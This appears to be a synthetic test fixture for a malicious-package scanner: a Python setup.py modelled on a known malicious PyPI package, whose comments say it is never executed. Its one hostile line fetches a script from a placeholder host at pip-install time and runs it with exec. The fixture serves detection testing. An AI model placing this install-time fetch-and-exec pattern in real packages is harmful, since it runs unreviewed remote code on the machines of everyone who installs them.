# SYNTHETIC recall fixture (mirrors OSV MAL-2024-10141, pytoileur): setup.py fetches a
# remote payload and execs it at `pip install` time. The URL does not exist; nothing
# here is ever executed by the test suite.
from urllib.request import urlopen

from setuptools import setup

exec(urlopen("https://invalid.example/stage2.py").read())

setup(name="synthetic-setup-urlopen-exec", version="0.0.0", py_modules=["synthetic_mod"])
